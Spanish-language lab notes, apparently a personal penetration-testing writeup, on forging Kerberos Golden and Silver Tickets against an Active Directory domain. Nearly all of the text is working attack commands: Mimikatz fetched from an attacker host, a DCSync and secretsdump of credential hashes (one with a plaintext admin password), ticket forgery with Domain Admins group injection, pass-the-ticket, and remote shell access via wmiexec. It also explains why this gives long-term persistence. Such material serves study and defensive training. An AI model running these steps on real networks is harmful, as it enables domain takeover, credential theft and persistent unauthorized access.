# Creación y Forja de Tickets: Golden Ticket y Silver Ticket

Notas prácticas de laboratorio sobre la **forja de tickets Kerberos** en Active Directory: extracción de hashes con Mimikatz y Secretsdump, generación de **Golden Tickets** y **Silver Tickets**, inyección en memoria (Pass-the-Ticket) y ejecución remota con `wmiexec.py`.

---

## Creación de Golden Ticket

Un **Golden Ticket** es un TGT forjado con el hash de la cuenta `krbtgt` que otorga acceso ilimitado como administrador a cualquier servicio del dominio.

### 1. Extracción del Hash de `krbtgt`

Obtenemos el hash NTLM de la cuenta `krbtgt` del dominio:

![Extracción hash krbtgt](assets/Pasted%20image%2020261011200417.png)

```text
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1ae48c342566ead9aed8411485671910:::
```

> [!NOTE]
> Identificamos que pertenece a `krbtgt` por su **RID 502**, el identificador numérico fijo que Windows asigna siempre a esta cuenta (`500 = Administrator`, `501 = Guest`, `502 = krbtgt`).

Obtenemos el **SID del dominio**:

```text
S-1-5-21-2202691511-3005246676-1411338595
```

---

### 2. Transferencia y Ejecución de Mimikatz

Descargamos Mimikatz en la máquina del Controlador de Dominio:

![Descarga Mimikatz](assets/Pasted%20image%2020261011203850.png)

```powershell
Invoke-WebRequest -Uri "http://192.168.100.139/mimikatz.exe" -OutFile "C:\Users\Administrator\Desktop\mimikatz.exe"
```

Ejecutamos `dcsync` localmente con Mimikatz para verificar los datos de `krbtgt`:

```cmd
.\mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"
```

![Mimikatz DCSync](assets/Pasted%20image%2020261011204947.png)

> [!INFO]
> Es básicamente lo mismo que hace `secretsdump.py` desde Linux, pero ejecutado desde adentro del DC con Mimikatz directamente contra el proceso LSASS.

---

### 3. Forja del Golden Ticket e Inyección (Pass The Ticket)

Forjamos el ticket e inyectamos directamente en la sesión actual:

```cmd
.\mimikatz.exe "kerberos::golden /user:jose /domain:domain.com /sid:S-1-5-21-2202691511-3005246676-1411338595 /krbtgt:1ae48c342566ead9aed8411485671910 /groups:512 /ticket:golden.kirbi" "kerberos::ptt golden.kirbi" "exit"
```

#### ¿Qué hace este comando? (Desglose de parámetros)

* `.\mimikatz.exe`: Ejecuta el binario.
* `"kerberos::golden ..."`: Módulo para forjar el ticket:
  * `/user:jose`: Nombre del usuario que va en el ticket (puede ser cualquiera, real o ficticio).
  * `/domain:domain.com`: Nombre FQDN del dominio.
  * `/sid:S-1-5-21-...`: SID del dominio (identifica el dominio a nivel de Windows).
  * `/krbtgt:1ae48...`: Hash NTLM de `krbtgt`, utilizado para **firmar y cifrar** el TGT.
  * `/groups:512`: Inyecta el **RID 512 (Domain Admins)** en el PAC del usuario.
  * `/ticket:golden.kirbi`: Archivo donde se guarda el ticket generado.
* `"kerberos::ptt golden.kirbi"`: **Pass The Ticket** — Inyecta el archivo `.kirbi` en la memoria de la sesión actual de LSASS.
* `"exit"`: Cierra Mimikatz limpiamente tras completar la forja e inyección.

![Forja de Golden Ticket](assets/Pasted%20image%2020261011205215.png)

Verificamos que el ticket esté cargado en la memoria de la sesión con `klist`:

```cmd
klist
```

![Verificación klist](assets/Pasted%20image%2020261011205502.png)

---

### 4. Uso del Golden Ticket desde Linux

Descargamos el archivo `golden.kirbi` a nuestra máquina atacante:

![Ticket en Linux](assets/Pasted%20image%2020261011210646.png)

Convertimos el formato `.kirbi` de Windows a `.ccache` compatible con Linux usando **ticketConverter.py**:

```bash
ticketConverter.py golden.kirbi golden.ccache
```

Exportamos la variable de entorno `KRB5CCNAME` y ejecutamos comandos remotos con `wmiexec.py`:

```bash
export KRB5CCNAME=golden.ccache
```

```bash
wmiexec.py -k -no-pass -dc-ip 192.168.100.50 SERVIDOR.domain.com
```

![Ejecución con wmiexec](assets/Pasted%20image%2020261011210859.png)

#### ¿Por qué es tan útil forjar un Golden Ticket?

Proporciona **persistencia a largo plazo**. Si el administrador del dominio cambia su contraseña mañana, su hash cambiará y perderemos el acceso por Pass-the-Hash. Sin embargo, el Golden Ticket se firma con el hash de `krbtgt` y puede configurarse con una validez de hasta 10 años, permitiendo reconectarnos en cualquier momento mientras no se renueve dos veces la clave de `krbtgt`.

#### ¿Por qué usar `wmiexec.py` en lugar de `evil-winrm`?
1. **Independencia de GSSAPI:** `evil-winrm` depende de las librerías GSSAPI del sistema operativo Linux, las cuales son muy sensibles al uso de mayúsculas/minúsculas en el realm (`domain.com` vs `DOMAIN.COM`). Impacket implementa Kerberos de forma nativa en Python, leyendo directamente el archivo `.ccache`.
2. **Protocolo:** `wmiexec.py` opera a través de WMI/RPC (puerto 135 y dinámicos), mientras que `evil-winrm` usa WinRM (puerto 5985). WMI resulta más tolerante con tickets forjados en entornos de prueba.

![Persistencia Golden Ticket](assets/Pasted%20image%2020261011215540.png)

---

## Creación de Silver Ticket

Un **Silver Ticket** es un Ticket de Servicio (TGS) forjado para un servicio específico (SPN) usando la clave de la cuenta de máquina o cuenta de servicio destino, **sin comunicarse con el KDC**.

### 1. Extracción del Hash de la Cuenta de Máquina

Volcamos los hashes del dominio con `secretsdump.py`:

```bash
secretsdump.py domain.com/Administrator:'2525j@vik'@192.168.100.50
```

![Volcado secretsdump](assets/Pasted%20image%2020261012031223.png)

Localizamos la cuenta de máquina del servidor (`SERVIDOR$`):

```text
SERVIDOR$:1000:aad3b435b51404eeaad3b435b51404ee:b91b4182290b30415da504eb777a25a9:::
```

> [!NOTE]
> **Estructura de RIDs en Windows:**
> - `500`: Administrator
> - `501`: Guest
> - `502`: krbtgt
> - `503`: DefaultAccount
> - `1000`: Primera cuenta creada posteriormente (`SERVIDOR$`).
> - `1103`: `WIN10-01$`
> - `1104`: `jose`
>
> Windows asigna RIDs secuencialmente a partir de 1000 para cuentas que no son built-in.

---

### 2. Forja del Silver Ticket con `ticketer.py`

Generamos el ticket de servicio para el recurso de archivos CIFS (SMB):

```bash
ticketer.py -nthash b91b4182290b30415da504eb777a25a9 -domain domain.com -domain-sid S-1-5-21-2202691511-3005246676-1411338595 -spn CIFS/SERVIDOR.domain.com jose
```

#### Desglose del comando:

* **`ticketer.py`**: Utilidad de Impacket para forjar tickets Kerberos (TGT y TGS).
* **`-nthash b91b4182290b30415da504eb777a25a9`**: Hash NTLM de **`SERVIDOR$`** (la cuenta que ejecuta el servicio), **no el de `krbtgt`**. Esta es la diferencia clave respecto al Golden Ticket.
* **`-domain domain.com`**: Nombre FQDN del dominio.
* **`-domain-sid S-1-5-21-2202691511-3005246676-1411338595`**: SID del dominio, necesario para construir los SIDs en el PAC.
* **`-spn CIFS/SERVIDOR.domain.com`**: El **SPN** (Service Principal Name) al que va dirigido el ticket:
  * `CIFS`: Protocolo SMB / recursos compartidos.
  * Otros SPNs posibles con el mismo hash:
    * `HTTP/SERVIDOR.domain.com` (IIS / Web)
    * `HOST/SERVIDOR.domain.com` (WMI / PSRemoting)
    * `MSSQLSvc/SERVIDOR.domain.com` (SQL Server)
    * `LDAP/SERVIDOR.domain.com` (Consultas LDAP)
* **`jose`**: Usuario indicado en el ticket. A diferencia del Golden Ticket, el KDC **nunca valida este usuario** porque el ticket se entrega directamente al servicio destino.

![Generación con ticketer.py](assets/Pasted%20image%2020261012031746.png)

---

### 3. Conexión y Acceso con el Silver Ticket

Establecemos la variable de entorno para usar el ticket `.ccache` generado:

```bash
export KRB5CCNAME=jose.ccache
```

Accedemos mediante `wmiexec.py`:

```bash
wmiexec.py -k -no-pass -dc-ip 192.168.100.50 SERVIDOR.domain.com
```

![Conexión wmiexec Silver Ticket](assets/Pasted%20image%2020261012032001.png)

![Acceso Confirmado](assets/Pasted%20image%2020261012032201.png)

Verificamos la ejecución exitosa del comando como administrador sobre el servidor:

![Finalización Silver Ticket](assets/Pasted%20image%2020261014235707.png)
